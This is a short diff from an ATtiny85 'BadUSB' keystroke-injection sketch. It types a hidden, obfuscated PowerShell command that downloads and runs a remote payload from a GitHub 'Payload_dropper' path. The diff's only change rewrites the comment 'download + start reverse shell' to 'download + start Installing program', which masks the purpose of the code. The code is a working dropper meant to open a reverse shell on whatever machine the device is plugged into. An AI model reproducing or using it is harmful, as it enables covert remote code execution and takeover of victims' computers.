@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1000);
 
-  // download + start reverse shell
+  // download + start Installing program 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sajithgairuka/Attiny85-Attcks/main/Payload_dropper/pd.txt');\"");
